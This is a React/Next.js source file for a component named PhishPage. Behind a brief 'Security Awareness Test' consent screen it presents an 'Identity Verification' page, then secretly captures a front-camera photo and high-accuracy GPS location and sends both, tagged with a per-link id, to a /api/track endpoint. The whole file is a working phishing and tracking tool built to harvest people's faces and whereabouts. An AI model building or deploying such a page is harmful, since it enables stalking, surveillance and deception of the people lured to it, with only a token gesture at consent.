import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';

export default function PhishPage() {
  const router = useRouter();
  const { id } = router.query;
  const [page, setPage] = useState('consent');
  const [status, setStatus] = useState('');

  const sendToAPI = async (type, extraData = {}) => {
    try {
      await fetch('/api/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ linkId: id, type, ...extraData })
      });
    } catch (e) {
      console.error('Failed to send data:', e);
    }
  };

  const takePhoto = async () => {
    setStatus('Requesting camera access...');
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' }
      });
      
      setStatus('Camera access granted! Capturing photo...');
      
      const video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline', '');
      video.setAttribute('autoplay', '');
      
      await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          resolve();
        };
      });
      
      await new Promise(r => setTimeout(r, 500));
      
      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, 640, 480);
      
      const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
      
      stream.getTracks().forEach(track => track.stop());
      
      setStatus('Photo captured! Sending...');
      
      await sendToAPI('photo', { photoData: photoDataUrl });
      
      setStatus('✅ Photo sent!');
      
    } catch (e) {
      setStatus('❌ Camera access denied. Please allow camera permission and try again.');
    }
  };

  const getLocation = async () => {
    setStatus('Requesting location...');
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 15000
        });
      });
      
      setStatus('Location obtained! Sending...');
      
      await sendToAPI('location', {
        coords: {
          lat: position.coords.latitude,
          lng: position.coords.longitude,
          accuracy: position.coords.accuracy
        }
      });
      
      setStatus('✅ Location sent!');
      
    } catch (e) {
      setStatus('❌ Location access denied.');
    }
  };

  if (page === 'consent') {
    return (
      <div style={{ padding: '40px', textAlign: 'center', fontFamily: 'Arial', maxWidth: '600px', margin: '0 auto' }}>
        <div style={{ backgroundColor: '#fff3cd', border: '1px solid #ffc107', borderRadius: '10px', padding: '20px', marginBottom: '20px' }}>
          <h1 style={{ color: '#856404' }}>⚠️ Security Awareness Test</h1>
        </div>
        <p style={{ fontSize: '16px', lineHeight: '1.6' }}>
          This is an authorized security awareness test.
        </p>
        <div style={{ textAlign: 'left', backgroundColor: '#f8f9fa', padding: '20px', borderRadius: '10px', margin: '20px 0' }}>
          <h3>By proceeding, you consent to:</h3>
          <ul style={{ lineHeight: '2' }}>
            <li>✅ Camera access for verification</li>
            <li>✅ Location access for verification</li>
          </ul>
        </div>
        <button 
          onClick={() => setPage('test')}
          style={{ padding: '15px 40px', fontSize: '18px', margin: '10px', background: '#28a745', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}
        >
          I Consent - Start Test
        </button>
      </div>
    );
  }

  return (
    <div style={{ padding: '40px', textAlign: 'center', fontFamily: 'Arial', maxWidth: '600px', margin: '0 auto' }}>
      <h1>Identity Verification</h1>
      <p style={{ color: '#666', marginBottom: '30px' }}>
        Your browser will ask for permission. You must click "Allow".
      </p>
      
      <div style={{ border: '1px solid #ddd', borderRadius: '10px', padding: '30px', margin: '20px 0' }}>
        <h2>📸 Step 1: Take Photo</h2>
        <button 
          onClick={takePhoto}
          style={{ padding: '15px 40px', fontSize: '16px', background: '#007bff', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}
        >
          Take Photo
        </button>
      </div>
      
      <div style={{ border: '1px solid #ddd', borderRadius: '10px', padding: '30px', margin: '20px 0' }}>
        <h2>📍 Step 2: Share Location</h2>
        <button 
          onClick={getLocation}
          style={{ padding: '15px 40px', fontSize: '16px', background: '#28a745', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}
        >
          Share Location
        </button>
      </div>
      
      {status && (
        <div style={{ marginTop: '20px', padding: '15px', backgroundColor: '#f8f9fa', borderRadius: '10px' }}>
          <p>{status}</p>
        </div>
      )}
    </div>
  );
}
